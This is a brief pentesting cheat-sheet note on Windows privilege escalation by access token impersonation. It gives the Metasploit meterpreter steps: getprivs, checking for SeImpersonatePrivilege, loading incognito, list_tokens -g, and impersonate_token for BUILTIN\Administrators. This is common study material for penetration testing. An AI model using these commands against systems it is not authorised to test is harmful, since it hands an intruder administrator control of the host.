# Access Token Impersination

---

is an form of priv esc in windows environment.

#### Metasploit

once we have a meterpreter session we can make getrprivs

getprivs

if "SeImpersonatePrivilege" is there, we can exploit it. 

load incognito

To list all available tokens:

```
list_tokens -g
```
To impersonate a token

```
impersonate_token "BUILTIN\Administrators" 
```

getuid --> gained privs of <delegation token>


